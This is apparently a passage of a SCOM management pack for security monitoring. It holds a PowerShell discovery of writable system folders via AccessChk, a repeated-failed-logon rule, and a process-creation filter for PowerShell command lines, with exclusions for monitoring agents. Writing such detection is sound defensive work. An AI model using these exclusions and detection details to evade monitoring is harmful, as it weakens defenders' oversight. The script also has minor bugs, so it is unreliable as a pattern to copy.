<ManagementPack ContentReadable="true" SchemaVersion="2.0" OriginalSchemaVersion="2.0" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <Manifest>
    <Identity>
      <ID>Security.Monitoring</ID>
      <Version>1.0.8.58</Version>
    </Identity>
    <Name>Security Monitoring</Name>
    <References>
      <Reference Alias="SCDW">
        <ID>Microsoft.SystemCenter.DataWarehouse.Library</ID>
        <Version>7.0.8427.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="SystemCenter">
        <ID>Microsoft.SystemCenter.Library</ID>
        <Version>6.0.0.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="MSSL">
        <ID>Microsoft.SystemCenter.ServiceDesigner.Library</ID>
        <Version>7.0.8433.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="Windows">
        <ID>Microsoft.Windows.Library</ID>
        <Version>7.5.8501.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="Health">
        <ID>System.Health.Library</ID>
        <Version>7.0.8427.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="System">
        <ID>System.Library</ID>
        <Version>7.5.8501.0</Version>
        <PublicKeyToken>31bf3856ad364e35</PublicKeyToken>
      </Reference>
      <Reference Alias="WindowsEventCollectorDiscovery">
        <ID>WindowsEventCollectorDiscovery</ID>
        <Version>1.0.0.25</Version>
        <PublicKeyToken>a6e03788df4b8847</PublicKeyToken>
      </Reference>
    </References>
  </Manifest>
  <TypeDefinitions>
    <EntityTypes>
      <ClassTypes>
        <ClassType ID="Security.Monitoring.AdminAccounts" Accessibility="Internal" Abstract="false" Base="Windows!Microsoft.Windows.ApplicationComponent" Hosted="false" Singleton="false" Extension="false">
          <Property ID="DistinguishedName" Type="string" AutoIncrement="false" Key="false" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
          <Property ID="Enabled" Type="string" AutoIncrement="false" Key="false" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
          <Property ID="Name" Type="string" AutoIncrement="false" Key="false" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
          <Property ID="SAMAccountName" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
          <Property ID="UPN" Type="string" AutoIncrement="false" Key="false" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.PDC_Emulator" Accessibility="Internal" Abstract="false" Base="Windows!Microsoft.Windows.LocalApplication" Hosted="true" Singleton="false" Extension="false">
          <Property ID="Name" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.SecurityMonitoringDA" Accessibility="Public" Abstract="false" Base="MSSL!Microsoft.SystemCenter.ServiceDesigner.Service" Hosted="false" Singleton="false" Extension="false">
          <Property ID="DomainDnsName" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.SecurityMonitoringDA.DomainControllers" Accessibility="Public" Abstract="false" Base="MSSL!Microsoft.SystemCenter.ServiceDesigner.ServiceComponentGroup" Hosted="false" Singleton="false" Extension="false">
          <Property ID="DomainDnsName" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.SecurityMonitoringDA.MemberServers" Accessibility="Public" Abstract="false" Base="MSSL!Microsoft.SystemCenter.ServiceDesigner.ServiceComponentGroup" Hosted="false" Singleton="false" Extension="false">
          <Property ID="DomainDnsName" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.WriteableLocations" Accessibility="Internal" Abstract="false" Base="Windows!Microsoft.Windows.LocalApplication" Hosted="true" Singleton="false" Extension="false">
          <Property ID="FolderPath" Type="string" AutoIncrement="false" Key="true" CaseSensitive="false" MaxLength="256" MinLength="0" Required="false" Scale="0" />
        </ClassType>
        <ClassType ID="Security.Monitoring.WriteableLocationsSeedClass" Accessibility="Internal" Abstract="false" Base="Windows!Microsoft.Windows.LocalApplication" Hosted="true" Singleton="false" Extension="false" />
        <ClassType ID="Security.Monitoring.WindowsComputersExtendedWriteableDirectoryMonitoring" Accessibility="Public" Abstract="false" Base="SystemCenter!Microsoft.SystemCenter.ComputerGroup" Hosted="false" Singleton="true" Extension="false" />
      </ClassTypes>
      <RelationshipTypes>
        <RelationshipType ID="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" Accessibility="Internal" Abstract="false" Base="System!System.Containment">
          <Source ID="Source" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA.DomainControllers" />
          <Target ID="Target" MinCardinality="0" MaxCardinality="2147483647" Type="Windows!Microsoft.Windows.Server.DC.Computer" />
        </RelationshipType>
        <RelationshipType ID="Security.Monitoring.SecurityMonitoringDARelationships" Accessibility="Internal" Abstract="false" Base="System!System.Containment">
          <Source ID="Source" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA" />
          <Target ID="Target" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA.DomainControllers" />
        </RelationshipType>
        <RelationshipType ID="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" Accessibility="Internal" Abstract="false" Base="System!System.Containment">
          <Source ID="Source" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA.MemberServers" />
          <Target ID="Target" MinCardinality="0" MaxCardinality="2147483647" Type="Windows!Microsoft.Windows.Computer" />
        </RelationshipType>
        <RelationshipType ID="Security.Monitoring.SecurityMonitoringDARelationshipsforMS" Accessibility="Internal" Abstract="false" Base="System!System.Containment">
          <Source ID="Source" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA" />
          <Target ID="Target" MinCardinality="0" MaxCardinality="2147483647" Type="Security.Monitoring.SecurityMonitoringDA.MemberServers" />
        </RelationshipType>
      </RelationshipTypes>
    </EntityTypes>
    <ModuleTypes>
      <DataSourceModuleType ID="SecurityMonitoringMP.Discoveries.DiscoverWriteableFileLocations" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="FrequencyInSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="AdditionalLocations" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="TimeOutSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="FrequencyInSeconds" Selector="$Config/FrequencyInSeconds$" ParameterType="int" />
          <OverrideableParameter ID="AdditionalLocations" Selector="$Config/AdditionalLocations$" ParameterType="string" />
          <OverrideableParameter ID="TimeOutSeconds" Selector="$Config/TimeOutSeconds$" ParameterType="int" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Discovery" TypeID="Windows!Microsoft.Windows.TimedPowerShell.DiscoveryProvider">
                <IntervalSeconds>$Config/FrequencyInSeconds$</IntervalSeconds>
                <SyncTime />
                <ScriptName>DiscoverWriteableLocations.PS1</ScriptName>
                <ScriptBody>param($sourceId,$managedEntityId,$computerName,$debug,$additionallocations)

#Constants used for event logging
$SCRIPT_NAME			= 'DiscoverWriteableLocations.ps1'
$EVENT_LEVEL_ERROR 		= 1
$EVENT_LEVEL_WARNING 	= 2
$EVENT_LEVEL_INFO 		= 4

$SCRIPT_STARTED			= 811 #These are event IDs you are creating for logging.
$CLASS_CREATED			= 812
$SCRIPT_ENDED			= 815

function Log-DebugEvent
{
	param($eventNo,$message)

	$message = "`n" + $message
	if ($debug = $true)
	{
    	$api.LogScriptEvent($SCRIPT_NAME,$eventNo,$EVENT_LEVEL_INFO,$message)
	}
}
$api = New-Object -comObject 'MOM.ScriptAPI'
$discoveryData = $api.CreateDiscoveryData(0, $sourceId, $managedEntityId)

$message =	'Script started' + "`n" + `
			'Source ID: ' + $sourceId + "`n" + `
			'Managed Entity ID: ' + $managedEntityId + "`n" + `
			'Computer Name: ' + $computerName 
Log-DebugEvent $SCRIPT_STARTED $message #Will run whether there's a debug or not

$OutputXML = $false
$DontFilterNTService = $false
$ShowGrantees = $false
$KnownAdmins
$RootDirectory = "%windir%"

# If RootDirectory has a trailing backslash, remove it (AccessChk doesn't handle it correctly).


# Entities for which to ignore write permissions.
# TrustedInstaller is always ignored; other NT SERVICE\ accounts are filtered
# out later (too many to list and too many unknown).
# The Package SIDs below (S-1-15-2-*) are associated with microsoft.windows.fontdrvhost and
# are not a problem. AppContainers never grant additional access; they only reduce access.
$FilterOut0 = @"
S-1-3-0
S-1-5-18
S-1-5-19
S-1-5-20
S-1-5-32-544
S-1-5-32-549
S-1-5-32-550
S-1-5-32-551
S-1-5-32-577
S-1-5-32-559
S-1-5-32-568
NT SERVICE\TrustedInstaller
S-1-15-2-1430448594-2639229838-973813799-439329657-1197984847-4069167804-1277922394
S-1-15-2-95739096-486727260-2033287795-3853587803-1685597119-444378811-2746676523
"@

# Filter all the above plus caller-supplied "known admins"
$FilterOut = ($FilterOut0.Split("`n`r") + $KnownAdmins | Where-Object { $_.Length -gt 0 }) -join ","
# Add all members of the local Administrators group, as the Effective Permissions
# APIs consider them to be administrators also.
# For some reason, Get-LocalGroup/Get-LocalGroupMember aren't available on WMFv5.0 on Win7;
# Verify whether command exists before using it. The commands are available on Win7 in v5.1.
if ($null -ne (Get-Command Get-LocalGroupMember -ErrorAction SilentlyContinue))
{
    #TODO: Detect and handle case where this cmdlet fails - disconnected and the admins group contains domain SIDs that can't be resolved.
    #FWIW, NET LOCALGROUP Administrators doesn't report these entries either.
    #Also fails on AAD-joined, with unresolved SIDs beginning with S-1-12-1-...
    Get-LocalGroupMember -SID S-1-5-32-544 -ErrorAction SilentlyContinue | ForEach-Object { $FilterOut += "," + $_.SID.Value }

}

$currfile = ""

#if ($OutputXML) { "&lt;root&gt;" }

$bInElem = $false
[System.Collections.ArrayList]$path = @()
if ($additionallocations -ne $null)
{
$path = @($additionallocations.split(','))
}
$path.add("%windir%")
$path.add("%programfiles%")
$path.add("%ProgramFiles% (x86)")

foreach ($item in $path)
{
if ($item.EndsWith("\")) { $item = $item.Substring(0, $item.Length - 1) }
AccessChk.exe /accepteula -nobanner -w -d -s -f $FilterOut $item | ForEach-Object {


	if ($_.StartsWith("  ") -or $_.Length -eq 0)
	{
        if ($_.StartsWith("  RW ") -or $_.StartsWith("   W "))
		{
			$grantee = $_.Substring(5).Trim()

			if ($DontFilterNTService -or (!$grantee.StartsWith("NT SERVICE\") -and !$grantee.StartsWith("S-1-5-80-")))
			{

				if ($currfile.Length -gt 0)
				{
					$instance = $discoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.WriteableLocations']$")
					$instance.AddProperty("$MPElement[Name='Windows!Microsoft.Windows.Computer']/PrincipalName$", $computerName)
					$instance.AddProperty("$MPElement[Name='Security.Monitoring.WriteableLocations']/FolderPath$", $currfile)
					 $discoveryData.AddInstance($instance)
						$message =	'Created' + $currfile + 'Service class' + "`n" + `
						'Computer Name: ' + $computerName + "`n"
					Log-DebugEvent $CLASS_CREATED $message
					$currfile = ""
					$bInElem = $true
				}
			}
		}
	}
		else
	{
		if ($bInElem -and $OutputXML) { "&lt;/dir&gt;" }
		$currfile = $_
		$bInElem = $false
	}

}
}
Log-DebugEvent -eventNo $SCRIPT_ENDED -$message
#Return the discovery data.
$discoveryData

# if ($bInElem -and $OutputXML) { "&lt;/dir&gt;" }
# if ($OutputXML) { "&lt;/root&gt;" }


</ScriptBody>
                <Parameters>
                  <Parameter>
                    <Name>sourceID</Name>
                    <Value>$MPElement$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>managedEntityID</Name>
                    <Value>$Target/Id$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>computerName</Name>
                    <Value>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>debug</Name>
                    <Value>$false</Value>
                  </Parameter>
                  <Parameter>
                    <Name>additionallocations</Name>
                    <Value>$Config/AdditionalLocations$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>$Config/TimeOutSeconds$</TimeoutSeconds>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Discovery" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.Discovery.Data</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoring.Event.RepeatedFailedLogind.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="Count" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="IPExclusion" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="Count" Selector="$Config/Count$" ParameterType="int" />
          <OverrideableParameter ID="IPExlusionRegEx" Selector="$Config/IPExclusion$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName />
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4625</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">PublisherName</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">Microsoft-Windows-Security-Auditing</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <Or>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">3</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">10</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[20]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotMatchRegularExpression</Operator>
                        <Pattern>$Config/IPExclusion$</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
              <ConditionDetection ID="CD" TypeID="System!System.ConsolidatorCondition">
                <Consolidator>
                  <ConsolidationProperties>
                    <PropertyXPathQuery>EventDisplayNumber</PropertyXPathQuery>
                    <PropertyXPathQuery>PublisherName</PropertyXPathQuery>
                    <PropertyXPathQuery>Params/Param[20]</PropertyXPathQuery>
                  </ConsolidationProperties>
                  <TimeControl>
                    <WithinTimeSchedule>
                      <Interval>$Config/IntervalSeconds$</Interval>
                    </WithinTimeSchedule>
                  </TimeControl>
                  <CountingCondition>
                    <Count>$Config/Count$</Count>
                    <CountMode>OnNewItemTestOutputRestart_OnTimerRestart</CountMode>
                  </CountingCondition>
                </Consolidator>
              </ConditionDetection>
            </MemberModules>
            <Composition>
              <Node ID="CD">
                <Node ID="Event" />
              </Node>
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.ConsolidatorData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.4688CommandAudit.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="InternalOption1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="InternalOption2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath5" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath6" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="Switch1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="Switch2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="Switch3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="Switch4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="OverrideablePath1" Selector="$Config/OverrideableFilePath1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideablePath2" Selector="$Config/OverrideableFilePath2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideablePath3" Selector="$Config/OverrideableFilePath3$" ParameterType="string" />
          <OverrideableParameter ID="OverrideablePath4" Selector="$Config/OverrideableFilePath4$" ParameterType="string" />
          <OverrideableParameter ID="OverrideablePath5" Selector="$Config/OverrideableFilePath5$" ParameterType="string" />
          <OverrideableParameter ID="OverrideablePath6" Selector="$Config/OverrideableFilePath6$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4688</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>powershell.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>$Config/InternalOption1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>$Config/InternalOption2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>Program Files\Microsoft Monitoring Agent\Agent\Health Service State</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[14]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>MicrosoftDependencyAgent.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[14]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>QualysAgent\QualysAgent.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[14]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>Program Files\Microsoft Monitoring Agent</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[14]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>ccmexec.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>\Operations Manager\Server\Health Service State</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>Program Files\Microsoft Dependency Agent\plugins\</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>\Microsoft System Center\Server\Health Service State\</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>RestartHealthService.ps1</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath4$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath5$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath6$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <Or>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>$Config/Switch1$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>$Config/Switch2$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>$Config/Switch3$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>$Config/Switch4$</Pattern>
                          </RegExExpression>
                        </Expression>
                      </Or>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="Security.Monitoring.AuditPol.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SyncTime" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="SubCommandAuditSetting" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="SyncTime" Selector="$Config/SyncTime$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Schedule" TypeID="System!System.SimpleScheduler">
                <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
                <SyncTime>$Config/SyncTime$</SyncTime>
              </DataSource>
              <ProbeAction ID="PSScript" TypeID="Security.Monitoring.AuditPol.PowerShell">
                <SubCommandAuditSetting>$Config/SubCommandAuditSetting$</SubCommandAuditSetting>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="PSScript">
                <Node ID="Schedule" />
              </Node>
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.BaseData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="Security.Monitoring.DistributedApplication.DataSource" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="ComputerName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="DomainDnsName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.TimedPowerShell.DiscoveryProvider">
                <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
                <SyncTime />
                <ScriptName>DistributedApplicationDCDiscovery.ps1</ScriptName>
                <ScriptBody>
                  Param($SourceId,$ManagedEntityId,$ComputerName,$DomainDnsName)
                  $ScriptName = "DistributedApplicationDCDiscovery.ps1"
                  $API = New-Object -comObject 'MOM.ScriptAPI'
                  $DiscoveryData = $API.CreateDiscoveryData(0, $SourceId, $ManagedEntityId)
                  $DistributedApplicationName = "Security Monitoring"

                  # Create the 'Distributed Application' instance
                  $DistributedApplication = $DiscoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA']$")
                  $DistributedApplication.AddProperty("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA']/DomainDnsName$", $DomainDnsName)
                  $DistributedApplication.AddProperty("$MPElement[Name='System!System.Entity']/DisplayName$", $DistributedApplicationName)
                  $DiscoveryData.AddInstance($DistributedApplication)
                  $DistributedApplicationDC = "Domain Controllers"

                  # Create the 'Windows Security Domain Controllers' instance
                  $DomainControllers = $DiscoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA.DomainControllers']$")
                  # Define the DomainDnsName property value
